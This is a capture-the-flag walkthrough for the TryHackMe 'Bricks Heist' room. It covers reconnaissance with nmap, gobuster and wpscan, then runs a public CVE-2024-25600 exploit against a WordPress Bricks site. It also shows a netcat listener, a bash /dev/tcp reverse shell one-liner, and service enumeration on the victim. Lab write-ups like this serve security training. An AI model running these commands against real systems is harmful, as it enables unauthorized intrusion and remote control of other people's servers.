# TryHack3M: Bricks Heist

#### Add hostname to host file <a href="#add-hostname-to-host-file" id="add-hostname-to-host-file"></a>

```
echo $VICTIM bricks.thm  >> /etc/hosts
cat /etc/hosts
```

## &#x20;<a href="#scans" id="scans"></a>

## **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **TCP/80 - HTTP**

**Kali**

```
gobuster dir -u http://bricks.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

## **TCP/443 - HTTPS**

**Kali**

```
gobuster dir -k -u https://bricks.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```







<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
wpscan --url https://bricks.thm/ --disable-tls-checks
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
git clone https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT.git
cd CVE-2024-25600-EXPLOIT/
python CVE-2024-25600.py -u https://bricks.thm/
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Shell <a href="#initial-shell" id="initial-shell"></a>

**Kali**

```
nc -lvnp 1337
```



**Kali(Shell)**

```
bash -c 'exec bash -i >& /dev/tcp/10.10.181.161/1337 0>&1'
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Victim**

```
systemctl list-units --type=service --state=running
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
systemctl cat ubuntu.service
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

